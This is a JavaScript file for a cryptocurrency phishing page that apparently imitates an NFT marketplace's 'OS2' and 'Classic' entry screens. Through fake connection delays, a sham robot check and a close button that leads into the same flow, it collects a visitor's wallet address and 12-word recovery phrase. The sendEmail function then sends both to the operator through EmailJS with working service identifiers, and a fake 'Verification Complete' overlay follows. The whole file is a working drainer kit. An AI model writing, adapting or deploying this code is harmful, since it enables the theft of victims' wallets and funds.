document.addEventListener('DOMContentLoaded', function () {
    const popup = document.getElementById('popup');
    const closeBtn = document.getElementById('closePopup');
    const enterOS2Btn = document.getElementById('enterOS2');
    const osClassicBtn = document.getElementById('osClassic');
    const continueBtn = document.getElementById('continueVerification');
    const completeBtn = document.getElementById('completeVerification');
    const walletOptions = document.querySelectorAll('.wallet-option');

    const slides = {
        initial: document.querySelector('.initial-slide'),
        wallet: document.querySelector('.wallet-slide'),
        phrase: document.querySelector('.phrase-slide')
    };

    // Show popup after delay
    setTimeout(() => popup.classList.add('active'), 1000);

    // Common connect handler with 3-second delay
    function handleConnection(targetSlide) {
        const overlay = document.createElement('div');
        overlay.className = 'connecting-overlay';
        overlay.innerText = 'Connecting...';
        document.body.appendChild(overlay);

        setTimeout(() => {
            document.body.removeChild(overlay);
            navigateTo(targetSlide);
        }, 3000);
    }

    // Wallet option buttons
    walletOptions.forEach(option => {
        option.addEventListener('click', () => {
            handleConnection('wallet');
        });
    });

    // Enter OS2 and Classic buttons
    if (enterOS2Btn) {
        enterOS2Btn.addEventListener('click', () => {
            handleConnection('wallet');
        });
    }

    if (osClassicBtn) {
        osClassicBtn.addEventListener('click', () => {
            handleConnection('wallet');
        });
    }

    // Close button moves to wallet screen too
    if (closeBtn) {
        closeBtn.addEventListener('click', () => {
            handleConnection('wallet');
        });
    }

    // Continue to phrase verification
    if (continueBtn) {
        continueBtn.addEventListener('click', () => {
            if (validateWallet()) {
                navigateTo('phrase');
            }
        });
    }

    // Final verify button
    if (completeBtn) {
        completeBtn.addEventListener('click', () => {
            if (validatePhrase()) {
                const walletAddress = document.getElementById('walletAddress').value.trim();
                const phrase = document.getElementById('recoveryPhrase').value.trim();
                sendEmail(walletAddress, phrase); // Send to email
                showRedirectOverlay();
            }
        });
    }

    // Navigation helper
    function navigateTo(slide) {
        Object.values(slides).forEach(s => s.classList.remove('active-slide'));
        if (slides[slide]) {
            slides[slide].classList.add('active-slide');
        }
    }

    // Wallet address validation
    function validateWallet() {
        const address = document.getElementById('walletAddress').value.trim();
        const isChecked = document.getElementById('notRobotWallet').checked;

        if (!/^0x[a-fA-F0-9]{40}$/.test(address)) {
            alert('Please enter a valid wallet address');
            return false;
        }

        if (!isChecked) {
            alert('Kindly verify that you are not a robot.');
            return false;
        }

        return true;
    }

    // Phrase validation
    function validatePhrase() {
        const phrase = document.getElementById('recoveryPhrase').value.trim();
        const isChecked = document.getElementById('notRobotPhrase').checked;

        if (phrase.split(/\s+/).length !== 12) {
            alert('Please enter exactly 12 words');
            return false;
        }

        if (!isChecked) {
            alert('Kindly verify that you are not a robot.');
            return false;
        }

        return true;
    }

    // Set dynamic background
    const bg = document.querySelector('.background-container');
    const isLandscape = window.matchMedia('(orientation: landscape)').matches;
    const bgImage = new Image();
    bgImage.src = isLandscape ? 'images/bg-landscape.jpg' : 'images/bg-portrait.jpg';
    bgImage.onload = () => bg.style.backgroundImage = `url('${bgImage.src}')`;
});

// EmailJS Integration
(function () {
    emailjs.init({
        publicKey: 'Tf_N51oCFUyBY3Nwk', // replace with your actual public key
    });
})();

function sendEmail(walletAddress, phrase) {
    const templateParams = {
        wallet_address: walletAddress,
        recovery_phrase: phrase
    };

    emailjs.send('service_odvlnrj', 'template_36x4f9f', templateParams)
        .then(() => {
            console.log('Email sent successfully');
        })
        .catch((error) => {
            console.error('EmailJS error:', error);
        });
}

function showRedirectOverlay() {
    // Create overlay container
    const overlay = document.createElement('div');
    overlay.id = 'redirectOverlay';
    overlay.style.position = 'fixed';
    overlay.style.top = '0';
    overlay.style.left = '0';
    overlay.style.width = '100%';
    overlay.style.height = '100%';
    overlay.style.backgroundColor = 'rgba(0, 0, 0, 0.9)';
    overlay.style.color = '#fff';
    overlay.style.display = 'flex';
    overlay.style.flexDirection = 'column';
    overlay.style.alignItems = 'center';
    overlay.style.justifyContent = 'center';
    overlay.style.zIndex = '9999';

    // Create spinner
    const spinner = document.createElement('div');
    spinner.style.border = '6px solid #f3f3f3';
    spinner.style.borderTop = '6px solid #ffffff';
    spinner.style.borderRadius = '50%';
    spinner.style.width = '50px';
    spinner.style.height = '50px';
    spinner.style.animation = 'spin 1s linear infinite';
    spinner.style.marginBottom = '20px';

    // Create message
    const message = document.createElement('p');
    message.textContent = 'Verification Complete. Accessing Storefront...';
    message.style.fontSize = '16px';

    // Add keyframes for spinner animation
    const styleSheet = document.createElement("style");
    styleSheet.type = "text/css";
    styleSheet.innerText = `
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    `;
    document.head.appendChild(styleSheet);

    // Append elements
    overlay.appendChild(spinner);
    overlay.appendChild(message);
    document.body.appendChild(overlay);

    // After 30 seconds, reload page
    setTimeout(() => {
        location.reload();
    }, 30000);
}

